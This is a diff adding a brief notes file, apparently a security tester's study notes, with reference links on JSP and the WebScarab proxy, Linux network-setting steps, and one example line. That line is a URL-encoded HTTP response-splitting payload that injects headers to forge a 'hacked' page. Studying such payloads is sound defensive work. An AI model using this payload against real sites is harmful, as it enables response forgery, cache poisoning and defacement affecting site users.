@@ -1,0 +1,11 @@
+[Reference]
+http://fanli7.net/a/JAVAbiancheng/JSPjishu/20121014/235702.html
+webscarab, http://wenku.baidu.com/view/6a87622f7375a417866f8fb1.html
+Windows(find service listened port),http://blog.xuite.net/cadmus.lin/yo/43386562-%E3%80%90%E7%B3%BB%E3%80%91%E5%A6%82%E4%BD%95%E6%9F%A5%E8%A9%A2%E5%93%AA%E5%80%8B%E7%A8%8B%E5%BC%8F%E4%BD%94%E7%94%A8%E4%BA%86%E6%8C%87%E5%AE%9APort
+
+[network setting]
+1.iface eth0 inet static => iface eth0 inet dhcp
+2./etc/init.d/networking restart 
+
+[Example](encodeURLComponent)
+test%0AContent-length%3A%200%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%3B%0AContent-length%3A%2019%0A%0A%3Chtml%3Ehacked%3C%2Fhtml%3E
